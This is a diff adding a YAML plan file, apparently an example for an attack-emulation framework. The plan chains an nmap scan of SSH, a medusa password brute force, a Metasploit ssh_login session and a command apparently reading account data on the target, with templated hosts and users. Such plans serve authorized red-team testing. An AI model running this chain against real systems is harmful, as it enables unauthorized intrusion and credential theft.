@@ -1,0 +1,61 @@
+---
+plan:
+  name: Advanced example
+  owner: test name
+  stages:
+  - name: stage-one
+    trigger_type: delta
+    trigger_args:
+      seconds: 5
+    steps:
+    - name: scan-localhost
+      is_init: true
+      attack_module: mod_nmap
+      attack_module_args:
+        target: "{{ target }}" # execution variable
+        ports:
+          - 22
+      next:
+        - type: result
+          value: OK
+          step: bruteforce
+    - name: bruteforce
+      attack_module: mod_medusa
+      attack_module_args:
+        target: "{{ target }}" # execution variable
+        credentials:
+          username: "{{ username }}" # execution variable
+          # default password_list will be used for bruteforce
+  - name: stage-two
+    depends_on:
+      - stage-one
+    trigger_type: HTTPListener
+    trigger_args:
+      host: localhost
+      port: 8082
+      routes:
+        - path: /index
+          method: GET
+          parameters:
+            - name: a
+              value: "1"
+    steps:
+    - name: ssh-session
+      is_init: true
+      attack_module: mod_msf
+      attack_module_args:
+        create_named_session: session_to_target_1
+        exploit: auxiliary/scanner/ssh/ssh_login
+        exploit_arguments:
+          RHOSTS: "{{ target }}"  # execution variable
+          USERNAME: $bruteforce.username
+          PASSWORD: $bruteforce.password
+      next:
+        - type: result
+          value: OK
+          step: session-cmd
+    - name: session-cmd
+      attack_module: mod_cmd
+      attack_module_args:
+        use_named_session: session_to_target_1
+        cmd: {{ commands.passwd }} # inventory file variable
